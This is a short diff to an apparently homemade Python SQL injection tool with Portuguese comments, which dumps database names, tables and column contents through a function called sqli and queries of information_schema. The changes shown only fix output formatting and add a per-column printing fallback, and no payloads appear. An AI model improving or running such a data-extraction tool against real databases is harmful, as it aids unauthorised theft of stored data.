@@ -53,9 +53,8 @@ def sqli(pull_type: str, diretory: str, extra: str="", column=False, C=False):
         infos = "\n<empty>"
     elif infos.replace(" ", "") == "" and not C:
         infos = "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m"
-    if not C: print()
     if C: return info
-    else: return infos
+    else: print();return infos
 #função que conta as colunas
 def pull_columns():
     global n
@@ -157,10 +156,18 @@ elif "-C" in argv:
     pull_columns()
     t = PrettyTable()
     err = False
+    print()
     for i in columns.split(","):
         res = sqli(i, f"{db}.{table}", C=True)
-        t.add_column(i, res)
-    print(t)
+        try: t.add_column(i, res)
+        except: err = True; break
+    if err:
+        for i in columns.split(","):
+            res = sqli(i, f"{db}.{table}", C=True)
+            t = PrettyTable()
+            t.add_column(i, res)
+            print(t)
+    else: print(t)
 elif "--dbs" in argv:
     pull_columns()
     res = sqli("table_schema", "information_schema.tables")
